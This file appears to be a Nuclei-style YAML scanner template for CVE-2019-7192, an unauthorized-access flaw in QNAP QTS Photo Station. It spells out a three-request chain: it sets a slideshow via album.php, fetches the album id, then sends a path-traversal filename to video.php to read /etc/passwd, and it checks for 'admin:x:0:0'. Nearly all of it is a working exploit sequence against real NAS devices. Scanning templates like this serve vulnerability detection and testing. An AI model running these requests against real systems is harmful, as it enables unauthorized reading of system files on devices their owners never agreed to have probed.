id: yaml-poc-qnap-qts-unauthorized_access-CVE-2019-7192
info:
  name: Yaml Poc Qnap Qts Unauthorized_Access Cve 2019 7192
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-qnap-qts-unauthorized_access-CVE-2019-7192'
  tags: unauth,cve
  classification:
    cve-id: CVE-2019-7192
  reference:
  - http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html
  - https://nvd.nist.gov/vuln/detail/CVE-2019-7192
  - https://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html
  - https://www.qnap.com/zh-tw/security-advisory/nas-201911-25
http:
- method: POST
  path:
  - /photo/p/api/album.php
  body: a=setSlideshow&f=qsamplealbum
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: GET
  path:
  - /photo/slideshow.php?album={{album_id}}
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /photo/p/api/video.php
  body: album={{album_id}}&a=caption&ac={{access_code}}&f=UMGObv&filename=./../../../../../etc/passwd
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - admin:x:0:0
